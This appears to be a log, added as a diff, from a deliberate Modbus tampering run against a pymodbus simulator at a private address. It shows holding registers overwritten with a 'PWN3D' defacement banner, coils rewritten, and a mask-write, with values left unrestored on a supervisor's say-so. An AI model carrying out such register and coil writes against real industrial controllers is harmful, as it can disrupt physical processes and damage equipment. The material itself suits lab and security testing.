@@ -1,0 +1,40 @@
+======================================================================
+DELIBERATE TAMPERING — pymodbus simulator at 192.168.1.95:502
+Timestamp: 2026-05-02T15:12:51.535631
+Authorization: Boss T, 2026-05-02 15:07 CDT — values NOT to be restored
+======================================================================
+
+[1] Pre-tamper snapshot (for the audit table)
+  pre holding[0..98] all == 0x0011? True
+  pre input[0..98]   all == 0x0011? True
+  pre coils[0..15]   = 0xffff
+  pre disc-in[0..15] = 0xffff
+
+[2] Writing 99 holding registers via FC16 (banner + counter pattern)
+  FC16 write 99 regs starting at addr 0 -> ok
+
+[3] Writing 16 coils via FC15 (pattern 0xAAAA)
+  FC15 write 16 coils to 0xAAAA -> ok
+
+[4] Attempting FC22 Mask Write Register (set bit 15 of addr 50)
+  FC22 mask-write addr 50 OR 0x8000 -> ok
+
+[5] Attempting input-register write (should fail per spec)
+  Note: per Modbus spec, input registers are read-only. No write FC exists for them.
+  pymodbus 2.x honors this — input registers will remain at original value.
+
+[6] Post-tamper read-back
+
+  post holding[0..98] sample (first 16): ['0x5057', '0x4e33', '0x4420', '0x4259', '0x204b', '0x494c', '0x4c41', '0x5420', '0x3230', '0x3236', '0x2d30', '0x352d', '0x3032', '0x2000', '0xde0e', '0xde0f']
+  decoded ASCII from holding[0..13]: b'PWN3D BY KILLAT 2026-05-02 \x00'
+  post coils[0..15]   = 0xaaaa (expected aaaa)
+  post disc-in[0..15] = 0xffff (unchanged — read-only)
+  post input[0..98]   first 4 = [17, 17, 17, 17] (unchanged — read-only)
+
+[7] Building change audit (saved to modbus-tamper.json)
+  holding registers changed: 99 / 99
+  coils changed:              8 / 16
+  input registers changed:    0 / 99 (read-only by spec)
+  discrete inputs changed:    0 / 16 (read-only by spec)
+
+TAMPERING COMPLETE — values left in modified state per Boss T's direction.
